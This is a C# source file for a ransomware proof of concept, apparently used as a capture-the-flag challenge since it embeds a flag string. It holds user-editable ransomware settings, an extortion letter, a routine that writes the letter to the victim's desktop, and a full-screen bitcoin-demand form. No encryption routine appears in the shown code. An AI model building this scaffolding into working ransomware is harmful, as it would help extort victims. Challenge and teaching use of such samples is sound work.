using System;
using System.IO;
using System.Windows.Forms;


namespace RansomwarePOC
{
    public partial class Form1 : Form
    {
        /*
         *  THIS IS A PROOF OF CONCEPT. DO NOT USE THIS TO COMMIT CRIME.
         *  I AM NOT RESPONSIBLE FOR YOU DOING DUMB STUFF.
         *  THIS SOURCE HAS BEEN USED AND MADE AVAILABLE
         *  FOR PRESENTATION AND EDUCATIONAL PURPOSES. 
         */



        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //

        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool ENCRYPT_DESKTOP = true;
        private const bool ENCRYPT_DOCUMENTS = true;
        private const bool ENCRYPT_PICTURES = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
        private const string ENCRYPT_PASSWORD = "Password1";
        private const string BITCOIN_ADDRESS = "Never accept ransomeware - just hack it ;)";
        private const string BITCOIN_RANSOM_AMOUNT = "1";
        private const string EMAIL_ADDRESS = "doofenshmirtz@gmail.com";

        // ----------------------------- END -------------------------------- //
        



        private static string ENCRYPTION_LOG = "";
        private string RANSOM_LETTER =
           "Oops, All of your files have been encrypted.\n\n" +
           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
           "Thank you and have a nice day!\n\n" +
           "Encryption Log:\n" +
           "----------------------------------------\n";
        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static int encryptedFileCount = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Threads
            /* ThreadStart createFileT = new ThreadStart(createFile);
             Console.WriteLine("In Main: createFile thread is started");
             Thread createFileThread = new Thread(createFileT);

             ThreadStart socketsT = new ThreadStart(initializeForm);
             Console.WriteLine("In Main: sockets thread is started");
             Thread socketsThread = new Thread(socketsT);

             socketsThread.Start();
             createFileThread.Start();
             */
            initializeForm();
        }
        private String getFlag() {
            return "CTF{7ev7rs7_4nginnering_4_Life}";
        }
        private void dropRansomLetter()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
            ransomWriter.WriteLine(RANSOM_LETTER);
            ransomWriter.WriteLine(ENCRYPTION_LOG);
            ransomWriter.Close();
        }

        private void formatFormPostEncryption()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = "Your files have been encrypted!";
        }

        private void initializeForm()
        {
            this.Opacity = 100;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Maximized;
            lblBitcoinAmount.Text = "Please send 5.54 Bitcoin(s) to the following BTC address:";
            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
            txtEmailAddress.Text = EMAIL_ADDRESS;
            lblBitcoinAmount.Focus();
        }
        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void lblCount_Click(object sender, EventArgs e)
        {

        }
    }
}
